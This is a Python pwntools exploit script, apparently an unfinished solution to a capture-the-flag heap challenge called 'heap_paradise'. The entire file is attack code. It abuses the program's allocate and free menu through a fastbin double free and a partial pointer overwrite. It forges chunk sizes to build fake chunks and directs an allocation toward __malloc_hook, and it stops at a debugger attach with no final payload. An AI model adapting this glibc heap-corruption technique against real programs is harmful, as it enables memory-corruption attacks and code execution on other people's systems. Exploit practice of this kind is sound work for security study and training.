from pwn import *

e = ELF("./heap_paradise")
libc = ELF("./libc_64.so.6")

if "--remote" in sys.argv:
  p = remote("", 0)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

nums = 0
def alloc(size=0x68, payload="AAAA"):
  global nums

  p.sendlineafter(":", "1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", payload + ("" if len(payload) == size else "\n"))

  nums += 1
  return nums - 1

def free(idx):
  p.sendlineafter(":", "2")
  p.sendlineafter(":", str(idx))

A = alloc(0x18)
B = alloc(0x18)
C = alloc(0x78, payload="A" * 0x18 + p64(0x21) + "A" * 0x18 + p64(0x21))
D = alloc(0x18)
E = alloc(0x18)
E_ = alloc(0x18)

free(A)
free(B)
free(A)

alloc(0x1, payload="\x30")
free(C)
# Fake Chunk
alloc(0x18, payload="A" * 0x8 + p64(0x21) + p64(0)) # B
alloc(0x18)

# Overwrite size of chunk C
F = alloc(0x18, payload="A" * 8 + p64(0xa1))
free(C)

# Set up fake chunk
free(B)
alloc(0x18, payload="A" * 0x8 + p64(0x31) + p64(0))

free(F)
alloc(0x19, payload="A" * 8 + p64(0x61) + p64(0) + p64(libc.symbols["__malloc_hook"] - 8)[0])
alloc(0x58)

free(F)
alloc(0x28, payload="A" * 8 + p64(0xc1))

gdb.attach(p, "x/5gx &__malloc_hook")
free(C)




p.interactive()
